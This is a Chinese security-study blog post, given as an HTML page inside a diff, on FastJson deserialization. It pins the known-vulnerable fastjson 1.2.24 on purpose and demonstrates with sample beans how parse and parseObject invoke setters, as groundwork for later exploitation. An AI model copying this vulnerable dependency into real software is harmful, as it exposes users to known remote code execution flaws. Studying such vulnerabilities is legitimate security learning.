@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="true" > 
+<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
+<link href="/fontawesome/css/brands.css" rel="stylesheet">
+<link href="/fontawesome/css/solid.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+
+  
+  <title>FastJson反序列化学习 | stoocea</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+
+  <meta name="description" content="首先是准备的maven依赖1.2.24是最开始FastJson爆出来的漏洞的那个版本 12345&lt;dependency&gt;  &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;  &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;  &lt;version&gt;1.2.24&lt;&#x2F;version&gt;  &amp;l">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FastJson反序列化学习">
+<meta property="og:url" content="http://example.com/2023/11/10/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="stoocea">
+<meta property="og:description" content="首先是准备的maven依赖1.2.24是最开始FastJson爆出来的漏洞的那个版本 12345&lt;dependency&gt;  &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;  &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;  &lt;version&gt;1.2.24&lt;&#x2F;version&gt;  &amp;l">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/1.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/2.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/3.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/4.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/5.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/7.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/8.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/9.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/10.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/11.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/12.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/13.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/14.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/15.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/16.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/17.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/18.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/19.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/20.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/21.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/22.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/23.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/24.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/25.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/26.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/28.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/27.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/29.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/30.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/31.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/32.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/33.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/34.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/35.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/36.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/37.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/38.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/39.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/40.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/41.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/42.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/43.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/44.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/45.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/46.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/47.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/48.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/49.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/50.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/51.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/52.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/53.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/54.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/55.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/56.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/57.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/58.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/59.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/60.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/61.png">
+<meta property="og:image" content="https://stoocea.github.io/images/FastJson/62.png">
+<meta property="article:published_time" content="2023-11-10T03:09:51.000Z">
+<meta property="article:modified_time" content="2023-11-12T03:33:35.369Z">
+<meta property="article:author" content="stoocea">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://stoocea.github.io/images/FastJson/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="stoocea" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="https://stoocea.github.io/images/rj3.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="https://stoocea.github.io/images/rj2.jpg" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="shadow   ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>stoocea </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
+      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS 订阅">
+        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
+      </a>
+    
+    <div id="nav-menu-btn" class="nav-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS 订阅">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=https://stoocea.github.io/images/rj3.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">Stoocea </div>
+      <div class="dot"></div>
+      <div class="subtitle">寻找归属感 </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/Stoocea" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+  <div class="sticky">
+    
+      
+
+
+
+    
+      
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">归档</h3>
+      
+      
+        <a class="archive-link" href="/archives/2023/11 ">
+          十一月 2023 
+          <div class="archive-count">2 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/10 ">
+          十月 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2023/08 ">
+          八月 2023 
+          <div class="archive-count">1 </div>
+        </a>
+      
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">最新文章</h3>
+      <ul>
+        
+          <a class="recent-link" href="/2023/11/10/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="FastJson反序列化学习" >
+            <div class="recent-link-text">
+              FastJson反序列化学习
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2023/11/02/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI初步学习" >
+            <div class="recent-link-text">
+              JNDI初步学习
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2023/10/24/RMI%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/" title="RMI的基本攻击方式总结" >
+            <div class="recent-link-text">
+              RMI的基本攻击方式总结
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2023/08/15/blog%E8%BF%81%E7%A7%BB%E5%8A%A8%E6%80%81%E4%BB%A5%E5%8F%8A%E6%9C%80%E8%BF%91%E7%9A%84%E4%BA%8B/" title="blog迁移动态以及最近的事" >
+            <div class="recent-link-text">
+              blog迁移动态以及最近的事
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+<article id="post-FastJson反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        FastJson反序列化学习
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2023-11-10T03:09:51.000Z" itemprop="datePublished">2023-11-10</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+    未分类 
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            8.1k 词 
+          </div>
+        </div>
+        
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <p>首先是准备的maven依赖<br>1.2.24是最开始FastJson爆出来的漏洞的那个版本</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>本次学习结合组长的视频以及各师傅的博客<br><a target="_blank" rel="noopener" href="https://goodapple.top/archives/832">https://goodapple.top/archives/832</a></p>
+<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Drun1baby/JavaSecurityLearning">https://github.com/Drun1baby/JavaSecurityLearning</a></p>
+<h2 id="1-FastJson概述"><a href="#1-FastJson概述" class="headerlink" title="1.FastJson概述"></a>1.FastJson概述</h2><p>在学习FastJson的安全漏洞之前，我们首先得了解一下什么是FastJson？</p>
+<blockquote>
+<p>Fastjson是阿里巴巴的开源JSON解析库，它可以解析 JSON 格式的字符串，支持将 Java Object 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 Java Object</p>
+</blockquote>
+<p>主要是两个接口来分别实现序列化和饭序列化操作<br><code>JSON.toJSONString</code> 将java对象转化为json对象，也就是序列化的过程</p>
+<p><code>JSON.parseObject/JSON.parse</code> 将json对象重新转化为java对象，顾名思义反序列化的过程</p>
+<p>以往的序列化和反序列化的过程中间都是序列化数据在承担运载数据的作用，但是在FastJson中就是用特殊的json数据承载这个任务了<br>还需要注意的一点是，在FastJson中并不是所有的java对象都能够被转化为JSON，只有javabean格式的对象才能够转化为JSON</p>
+<h3 id="fastjson简单实现"><a href="#fastjson简单实现" class="headerlink" title="fastjson简单实现"></a>fastjson简单实现</h3><p>写一个student类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单格式的javabean</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line"><span class="keyword">private</span> String name;  </span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">System.out.println(<span class="string">&quot;构造函数&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line"><span class="keyword">return</span> name;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line"><span class="built_in">this</span>.name = name;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line"><span class="keyword">return</span> age;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">System.out.println(<span class="string">&quot;setAge&quot;</span>);  </span><br><span class="line"><span class="built_in">this</span>.age = age;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后写一个作用类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson_Learning</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">Person person=<span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">person.setName(<span class="string">&quot;Faster&quot;</span>);  </span><br><span class="line">person.setAge(<span class="number">18</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//将person对象序列化  </span></span><br><span class="line">System.out.println(<span class="string">&quot;-----序列化过程如下------&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">String JSON_Serialize=JSON.toJSONString(person);  </span><br><span class="line">System.out.println(JSON_Serialize);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//将person对象的序列化数据反序列化成一个JSONObject  </span></span><br><span class="line">System.out.println(<span class="string">&quot;-----反序列化过程如下------&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//用parse方法进行反序列化  </span></span><br><span class="line">Object o1=JSON.parse(JSON_Serialize);  </span><br><span class="line">System.out.println(o1.getClass().getName());  </span><br><span class="line">System.out.println(o1);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//用parseObject方法进行反序列化  </span></span><br><span class="line">Object o2=JSON.parseObject(JSON_Serialize);  </span><br><span class="line">System.out.println(o2.getClass().getName());  </span><br><span class="line">System.out.println(o2);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//用parseObject方法反序列化的另一种形式--指定类，将JSON数据反序列化成一个指定的对象  </span></span><br><span class="line">Object o3=JSON.parseObject(JSON_Serialize,Person.class);  </span><br><span class="line">System.out.println(o3.getClass().getName());  </span><br><span class="line">System.out.println(o3);  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>作用结果如下</p>
+<p><img src="https://stoocea.github.io/images/FastJson/1.png">)</p>
+<p>能够正常调用Person对象里面的方法。<br>进一步的分析，这次我们给Person对象内写入构造方法 然后给每一个调用方法写一个sout来标识它的调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson_Learning</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line"><span class="comment">//Person person=new Person();  </span></span><br><span class="line"><span class="comment">// person.setName(&quot;Faster&quot;);  </span></span><br><span class="line"><span class="comment">// person.setAge(18);  </span></span><br><span class="line">  </span><br><span class="line">String JSON_Serialize=<span class="string">&quot;&#123;\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;</span>;  </span><br><span class="line"><span class="comment">//将person对象序列化  </span></span><br><span class="line"><span class="comment">// System.out.println(&quot;-----序列化过程如下------&quot;);  </span></span><br><span class="line"><span class="comment">//  </span></span><br><span class="line"><span class="comment">// String JSON_Serialize=JSON.toJSONString(person);  </span></span><br><span class="line"><span class="comment">// System.out.println(JSON_Serialize);  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//将person对象的序列化数据反序列化成一个JSONObject  </span></span><br><span class="line">System.out.println(<span class="string">&quot;-----反序列化过程如下------&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//用parse方法进行反序列化  </span></span><br><span class="line"><span class="comment">// Object o1=JSON.parse(JSON_Serialize);  </span></span><br><span class="line"><span class="comment">// System.out.println(o1.getClass().getName());  </span></span><br><span class="line"><span class="comment">// System.out.println(o1);  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//用parseObject方法进行反序列化  </span></span><br><span class="line"><span class="comment">//Object o2=JSON.parseObject(JSON_Serialize);  </span></span><br><span class="line"><span class="comment">//System.out.println(o2.getClass().getName());  </span></span><br><span class="line"><span class="comment">//System.out.println(o2);  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//用parseObject方法反序列化的另一种形式--指定类，将JSON数据反序列化成一个指定的对象  </span></span><br><span class="line">Person o3=JSON.parseObject(JSON_Serialize,Person.class);  </span><br><span class="line">System.out.println(o3.getName());  </span><br><span class="line"><span class="comment">//System.out.println(o3);  </span></span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果如下<br><img src="https://stoocea.github.io/images/FastJson/2.png">)</p>
+<p>发现FastJson的反序列化过程是通过调用指定javabean的set方法去对参数赋值，而不是反射之类，期间也会调用构造方法<br>直到现在都没啥问题，也没有什么漏洞点，但是FastJson提供了一种可以任意反序列化类的方式</p>
